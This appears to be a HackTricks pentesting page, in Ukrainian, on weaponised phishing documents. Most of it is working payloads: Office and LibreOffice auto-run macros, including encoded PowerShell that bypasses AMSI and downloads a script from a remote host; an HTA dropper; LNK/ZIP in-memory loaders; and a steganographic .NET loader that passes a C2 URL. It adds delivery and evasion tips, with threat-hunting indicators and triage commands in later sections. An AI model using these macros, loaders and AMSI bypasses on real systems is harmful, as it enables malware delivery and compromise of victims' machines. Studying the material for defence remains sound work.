# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word перевіряє дані файлу перед його відкриттям. Перевірка даних виконується шляхом визначення структури даних відповідно до стандарту OfficeOpenXML. Якщо під час визначення структури даних виникає помилка, файл, який аналізується, не буде відкрито.

Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак розширення файлу можна змінити, і макроси все одно зможуть виконуватися.\
Наприклад, RTF-файли за задумом не підтримують макроси, але файл DOCM, перейменований на RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всіх програм Microsoft Office Suite (Excel, PowerPoint тощо).

За допомогою наведеної нижче команди можна перевірити, які розширення запускатимуться в деяких програмах Office:

```bash
assoc | findstr /i "word excel powerp"
```

Файли DOCX, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить macros, також можуть «виконувати» macros.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Категорії**: Links and References, **Назви полів**: includePicture, **Ім’я файлу або URL-адреса**:_ http://<ip>/whatever

![Документи Office — завантаження зовнішнього зображення: перейдіть до: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor на основі макросів

За допомогою macros можна виконувати довільний код із документа.

#### Функції автоматичного завантаження

Що частіше вони використовуються, то ймовірніше, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду для macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Видаліть метадані вручну

Перейдіть до **File > Info > Inspect Document > Inspect Document** — відкриється інспектор документів. Натисніть **Inspect**, а потім **Remove All** поруч із пунктом **Document Properties and Personal Information**.

#### Розширення DOC

Коли завершите, виберіть розкривний список **Save as type** і змініть формат із **`.docx`** на Word 97-2003 **`.doc`**.\
Зробіть це, оскільки **не можна зберігати macros у файлі `.docx`**, а розширення з підтримкою macros **`.docm`** має **погану репутацію** (наприклад, на мініатюрі є велике `!`, а деякі веб- і поштові шлюзи повністю блокують такі файли). Тому застаріле розширення **`.doc` — найкращий компроміс**.

#### Генератори шкідливих macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Автозапуск macros LibreOffice ODT (Basic)

Документи LibreOffice Writer можуть містити macros Basic і запускати їх автоматично під час відкриття файлу, прив’язавши macro до події **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Проста macro reverse shell виглядає так:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Зверніть увагу на подвоєні лапки (`""`) усередині рядка: LibreOffice Basic використовує їх для екранування буквальних лапок, тому payloads, що закінчуються на `...==""")`, зберігають збалансованими і внутрішню команду, і аргумент Shell.

Поради щодо доставки:

- Збережіть файл у форматі `.odt` і прив’яжіть macro до події документа, щоб він запускався одразу після відкриття.
- Надсилаючи email за допомогою `swaks`, використовуйте `--attach @resume.odt` (символ `@` потрібен, щоб вкладенням передавалися байти файлу, а не рядок із назвою файлу). Це критично під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## Файли HTA

HTA — це програма для Windows, яка **поєднує HTML і мови скриптів (наприклад, VBScript і JScript)**. Вона створює інтерфейс користувача та виконується як застосунок із «повною довірою», без обмежень моделі безпеки браузера.

HTA запускається за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, тому `mshta` залежить від IE. Отже, якщо його було видалено, HTA не зможуть запускатися.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Примусова автентифікація NTLM

Є кілька способів **віддалено змусити виконати автентифікацію NTLM**. Наприклад, можна додати **невидимі зображення** до електронних листів або HTML-сторінок, які відкриватиме користувач (навіть через HTTP MitM?). Або надіслати жертві **адресу файлів**, яка **спричинить** **автентифікацію** вже під час **відкриття папки**.

**Перегляньте ці та інші ідеї на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте: можна не лише викрасти хеш або дані автентифікації, а й **виконувати атаки NTLM relay**:

- [**Атаки NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-завантажувачі + payload-и, вбудовані в ZIP (безфайловий ланцюжок)

Високоефективні кампанії доставляють ZIP-архів із двома легітимними документами-приманками (PDF/DOCX) і шкідливим файлом .lnk. Фокус у тому, що сам PowerShell-завантажувач міститься в необроблених байтах ZIP після унікального маркера, а файл .lnk витягує його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий процес, реалізований однорядковою командою PowerShell у файлі .lnk:

1) Знайти вихідний ZIP у типових розташуваннях: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і батьківському каталозі поточного робочого каталогу.
2) Зчитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера — це вбудований PowerShell-payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати там і відкрити документ-приманку .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для витягування та запуску вбудованого етапу:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Нотатки
- Для доставлення часто зловживають субдоменами авторитетних PaaS (наприклад, *.herokuapp.com) і можуть обмежувати доступ до payload (видавати нешкідливі ZIP-файли залежно від IP/UA).
- На наступному етапі часто розшифровують base64/XOR shellcode і виконують його через Reflection.Emit + VirtualAlloc, щоб звести до мінімуму сліди на диску.

Закріплення в тому самому ланцюжку
- Перехоплення COM TypeLib для елемента керування Microsoft Web Browser, щоб IE/Explorer або будь-яка програма, що його вбудовує, автоматично повторно запускала payload.<sup>[[2]](#references)[[4]](#references)</sup> Докладніше й готові до використання команди — тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук загроз/IOC
- ZIP-файли, що містять доданий до даних архіву ASCII-маркер (наприклад, xFIQCV).
- `.lnk`, який перебирає батьківські теки/теки користувача, щоб знайти ZIP-файл, і відкриває документ-приманку.
- Підміна AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Довгі ділові листування, що завершуються посиланнями на довірених доменах PaaS.

## Поетапне розгортання з приманкою через LNK → закріплення через scheduled task → довірене CPL side-loading

Ще один поширений шаблон — **`.lnk`, що видає себе за документ**, одразу відкриваючи нешкідливу приманку, поки у фоновому режимі розгортається справжній ланцюжок.<sup>[[3]](#references)</sup>

Спостережуваний процес:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний проксі для запуску обфускованого завантажувача PowerShell.
2. PowerShell розбиває очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), щоб прості засоби виявлення, які шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, не розпізнали команду.
3. Стейджер спершу завантажує **документ-приманку**, відкриває його для жертви, а потім відновлює шкідливі файли у фоновому режимі.
4. Payload можуть записуватися з **фіктивними розширеннями**, а потім перейменовуватися шляхом видалення символів-заповнювачів, що затримує появу очевидних артефактів `.exe` / `.cpl`.
5. Закріплення забезпечується **scheduled task із запуском щохвилини**, яка запускає довірений бінарний файл-хост із каталогу, доступного для запису користувачем.

Мінімальні ознаки для пошуку загроз у цьому шаблоні:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Корисне компонування staging, яке варто розпізнавати:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому другий етап непомітний

У кейсі Rapid7 заплановане завдання постійно запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки поруч було розміщено **`APPWIZ.cpl`**, який експортував **`RunFODW`**, довірений бінарний файл Microsoft завантажував CPL зловмисника замість легітимної системної копії.

Потім CPL:
- Зчитує blob **AES-256-CBC** з `C:\Windows\Tasks\editor.dat`
- Розшифровує його через **Windows CNG / `bcrypt.dll`**
- Виділяє виконувану пам’ять і копіює туди розшифрований shellcode
- Виконує його непрямо, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимною WinAPI-функцією, що приймає callback**, щоб передати виконання.

Розшифрованим payload у цій кампанії був shellcode **Donut**, який повністю завантажував кінцевий PE у пам’ять і патчив **AMSI/WLDP/ETW** у поточному процесі перед передаванням керування. Докладніше про sideloading і post-processing у пам’яті дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні напрямки для пошуку:
- `.lnk`, що запускає `powershell.exe` або `conhost.exe`, а за ним — видимий документ-приманку.
- Короткочасні завантаження до **`C:\Users\Public\`**, після яких одразу перейменовуються файли з безглуздими розширеннями.
- Заплановані завдання з непомітними назвами на кшталт `GoogleErrorReport`, які запускаються з **каталогів, доступних для запису користувачам**.
- Завантаження довіреними бінарними файлами **`.cpl` / `.dll`** з того самого каталогу, що не є системним.
- Текстові blob-и Base64, записані до **`C:\Windows\Tasks\`**, а потім зчитані модулем, завантаженим через sideloading.

## Payload-и зі стеганографічними роздільниками в зображеннях (PowerShell stager)

Нещодавні ланцюжки завантаження доставляють обфускований JavaScript/VBS, який декодує та запускає PowerShell stager у Base64. Цей stager завантажує зображення (часто GIF), що містить приховану у вигляді звичайного тексту між унікальними початковим і кінцевим маркерами DLL .NET у Base64. Скрипт шукає ці роздільники (приклади, помічені в реальних атаках: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, декодує його з Base64 у байти, завантажує збірку в пам’ять і викликає відомий метод входу, передаючи URL C2.<sup>[[5]](#references)</sup>

Робочий процес
- Етап 1: архівований JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager із параметрами -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, вилучає Base64 між маркерами, завантажує DLL .NET у пам’ять і викликає її метод (наприклад, VAI), передаючи URL C2 та параметри.
- Етап 3: loader отримує кінцевий payload і зазвичай впроваджує його за допомогою process hollowing у довірений бінарний файл (зазвичай MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Докладніше про process hollowing і виконання через довірені утиліти-проксі дивіться тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вилучення DLL із зображення та виклику методу .NET у пам’яті:

<details>
<summary>PowerShell-екстрактор стего-payload і loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Примітки
- Це ATT&CK T1027.003 (стеганографія/приховування маркерів).<sup>[[6]](#references)</sup> Маркери відрізняються залежно від кампанії.
- AMSI/ETW bypass і деобфускацію рядків зазвичай виконують до завантаження assembly.
- Пошук загроз: скануйте завантажені зображення на наявність відомих роздільників; виявляйте PowerShell, який звертається до зображень і відразу декодує Base64 blobs.

Див. також stego tools і carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-дропери → Base64-стадинг PowerShell

Поширений початковий етап — невеликий, сильно обфускований файл `.js` або `.vbs`, доставлений в архіві. Його єдина мета — декодувати вбудований Base64-рядок і запустити PowerShell з `-nop -w hidden -ep bypass`, щоб завантажити наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Схематична логіка (абстрактно):
- Прочитати вміст власного файла
- Знайти Base64 blob між рядками-заповнювачами
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, що запускає `powershell.exe`

Ознаки для пошуку
- Архівні вкладення JS/VBS, що запускають `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` із тимчасових каталогів користувача.

## Документи MSC як контейнери для виконання (GrimResource)

Файли Microsoft Management Console (`.msc`) — це XML-визначення консолей, які зазвичай відкриваються через `mmc.exe`. **GrimResource** використовує посилання `StringTable` на ресурс `apds.dll`, що містить застарілий XSS-примітив, тому відкриття користувачем спеціально створеної консолі запускає JavaScript усередині `mmc.exe`. Виявлені зразки поєднували обфускацію на основі `transformNode` з **DotNetToJScript**, щоб створити .NET payload без звичного шляху через макроси Office.<sup>[[9]](#references)</sup>

Під час статичного тріажу розглядайте ненадійний MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Високосигнальними ознаками під час виконання є завантаження `mmc.exe` CLR або компонентів скриптів, створення мережевих з’єднань чи запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` або неочікуваного виконуваного файла. Формат легітимний, тому виявлення має корелювати **джерело + підозрілий XML/вміст скрипта + поведінку `mmc.exe`**, а не блокувати всі MSC.<sup>[[9]](#references)</sup>

## PDF/QR-перенаправлення та керування доставкою payload

PDF не обов’язково має містити експлойт, щоб бути корисним. У нещодавніх кампаніях у документ, що має невинний вигляд, додають **QR-код або звичайне посилання**, переводять браузерну сесію за межі засобів контролю пошти й персоналізують адресу призначення за адресою одержувача. Microsoft задокументувала PDF-файли 2025 року з QR-URL, унікальними для кожного одержувача, які вели до інфраструктури викрадення облікових даних RaccoonO365; у паралельному ланцюжку використовували фільтрацію за IP-адресою та середовищем: вибраним відвідувачам надавали шлях до JavaScript/MSI, а сканерам або клієнтам, які не відповідали вимогам, — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час первинного аналізу перевіряйте і дії PDF, і відрендерені QR-коди. QR-код може бути намальований векторно, а не збережений як зображення, яке можна витягти, тому растеризуйте кожну сторінку, а також витягайте вбудовані зображення:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Перевіряйте декодовані адреси призначення та ланцюжки перенаправлень з ізольованої системи аналізу, не проходячи автентифікацію. Корисні ознаки для пошуку: PDF-файли лише з QR-кодом і майже порожнім текстом листа, адреса електронної пошти одержувача в параметрі запиту, кілька перенаправлень через надійні хостингові платформи та різний вміст залежно від IP-адреси, геолокації, cookies, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки один запит із sandbox може отримати лише приманку.<sup>[[10]](#references)</sup>

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Кампанія ZipLine: складна фішингова атака на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження тактик Dropping Elephant у ланцюжку завантажувачів на тему Китаю](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Нова техніка COM-персистентності (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader доставляє низку infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Стеганографія (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Hollowing процесу (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Виконання через проксі довірених утиліт розробника: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для первинного доступу та ухилення від виявлення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Зловмисники використовують податковий сезон для фішингових кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
